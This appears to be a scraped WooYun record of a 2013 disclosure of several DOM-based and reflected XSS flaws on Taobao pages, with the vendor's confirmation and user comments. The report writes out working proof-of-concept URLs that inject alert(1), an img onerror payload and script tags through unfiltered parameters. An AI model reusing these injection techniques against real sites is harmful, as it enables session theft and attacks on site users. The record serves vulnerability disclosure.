{"id": 13383, "wybug_id": "wooyun-2013-019556", "wybug_title": "淘宝主域名下多处Dom XSS", "wybug_corp": "淘宝网", "wybug_author": "gainover", "wybug_date": "2013-03-05 15:36", "wybug_open_date": "2013-04-19 15:36", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-03-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-03-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-04-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-04-19：\t细节向公众公开  简要描述： .... 打包一起发了吧！ 详细说明：  1. eval导致的dom xsshttp://www.taobao.com/go/act/sns/ui.php?name=alert(1)&ui=%7Bwidth%3A130%2Cheight%3A60%7D&tiaocfg=%7Bsource%3A%22module%22%2CmoduleId%3A%2210%22%2Citems%3A%5B%7Bid%3A%2212877916061%22%2Cpic%3A%22%22%7D%5D%7D&Sharecfg=%7B%7D&callback=%7Binit%3A%22xdcb_sns87fcf3117670a_parent%22%2Chide%3A%22xdcb_snsb1490bea6fc62_parent%22%2Cshow%3A%22xdcb_sns3a2ea08a237c7c_parent%22%7D&_iframe_id=%22sns1cfb66c62805a9%22name的值被传入了eval中。\n\n2. \\ 未过滤，并动态输出至页面，导致xss.http://www.taobao.com/view_image.php?pic=Wx0GGlFDXA1VUwMDWx0SCwkNGRFcVxxQW1UcCxMFRBkDCFdVV1cRRhpVRDhHEVp3YmtTbngxKgslQh0XDGsDB0FbR1NFBgYV&title=ob7Qx9S3w%2FvXsaG%2FID%2FQwsTvuvOw67PMuPrXsT8gMjAwfjYwMNSq&version=2&c=ZGY0YmE1MWYzODZiMDU3NWYxZTYyNzYxNDFjZGZiZjM%3D&itemId=\\x22\\x3e\\x3cimg\\x20src=1\\x20onerror=alert(1)\\x3e\\x3ci\\x20a=\\x22pkavoverx&shopId=34423124&sellerRate=28&dbId=&fv=9itemId未过滤 \\ .\n\n3. 调用外部JS时，参数被控，导致多处xsshttp://www.taobao.com/go/act/sale/danpin660x90-0813.php?p4p=alert(1);pkavoverhttp://www.taobao.com/go/act/sale/danpin190x300-0809.php?p4p=alert(1);pkavoverhttp://www.taobao.com/go/act/sale/danpin336x280-02.php?p4p=alert(1);pkavoverhttp://www.taobao.com/go/act/sale/tbkelite_mainchannel1.php?callback=alert(1);pkavoverhttp://www.taobao.com/go/act/danpin300x250ceshi0915.php?p4p=alert(1);pkavover可以看到调用的外部JS使用了 p4p参数, p4p参数可控\n\n调用的外部JS文件的p4p参数，修改为alert(1);gainover 即注入了我们自己的JS代码。\n\n4. 参数未过滤，导致XSS, 仅IE下有效 ：(http://www.taobao.com/go/act/try/widget-iframe.php?widget=0&type=32&status=1&tag=%BD%F0%B1%D2&sort=buyStatus_startTime&maxNum=50&pic=160&width=740&height=1200&layout=1&pt=%22%3E11111%3Cscript defer%3Ealert(1)%3C/script%3E&pl=20&btn1=skin01&btn2=skin03&btn3=skin06&randomNum=54776&gold=1&btnText=%E5%85%A8%E9%A2%9D%E5%85%91%E6%8D%A2\n\n5. 还有一枚子域名下的，参数未过滤，出现在js context下。http://member1.taobao.com/member/autoReglogin/auto_reglogin.htm?reg_type=0&is_need_login=true&is_need_reg=true&from=autoReglogin&dis_title=false&callback=TB.app.FastBuy.DoAuth&auto_iframe_height=a;alert(1)}catch(e){}};alert(1);function aa(){try{eval本来还有其它两处的，貌似时间久了，已经修复啦～～   漏洞证明：  见详细说明   修复方案：  对症下药   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2013-03-05 16:09 厂商回复： 感谢你对我们的关注与支持~ 稍后我们会寄送礼品表示感谢~ ^_^ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-03-05 15:39 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  第一个    \n     2013-03-05 15:39 |    \t\tlsh4ck \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:14        | 不是黑客!但是黑客手段都要会?)\t\t \n  第二个    \n     2013-03-05 15:43 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  第三个    \n     2013-03-05 15:43 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  第四个    \n     2013-03-05 15:48 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  第五个    \n     2013-03-05 15:55 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  第六个    \n     2013-03-05 15:57 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  第七个    \n     2013-03-05 15:58 |    \t\tsaviourtech \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | http://www.saviour.com.cn)\t\t \n  我早就说过 国内的Dom XSS很多！@小胖胖要减肥 @lsh4ck @xsser @梧桐雨 @zeracker @zzR    \n     2013-03-05 15:59 |    \t\tlsh4ck \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:14        | 不是黑客!但是黑客手段都要会?)\t\t \n  @saviourtech 不要破坏美观，重新发！    \n     2013-03-05 16:14 |    \t\tsaviourtech \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | http://www.saviour.com.cn)\t\t \n  @gainover 搞搞邮箱的Dom XSS    \n     2013-03-05 17:57 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  。。啥时候攒的。。为了充气娃娃么。哈哈~    \n     2013-03-05 18:04 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @saviourtech :) 马上就能看到邮箱的了～    \n     2013-03-05 20:53 |    \t\tsaviourtech \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | http://www.saviour.com.cn)\t\t \n  @gainover 给我个pkav scan！    \n     2013-03-05 21:59 |    \t\t点点 \t\t\t( 普通白帽子  |\t\t\t        Rank:214 漏洞数:38        | 准备申请سمَـَّوُوُحخ ̷̴̐...)\t\t \n  前排出售    \n     2013-04-05 01:10 |    \t\t无名小卒 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 我不是黑阔，但我认识的全是黑阔！)\t\t \n  淘宝的恢复给力！！    \n     2014-04-28 22:21 |    \t\t橘子 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        | 呢个...羞射高中生一枚。带上大神@Haswell...)\t\t \n  @gainover 同求pkav xss scan~    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}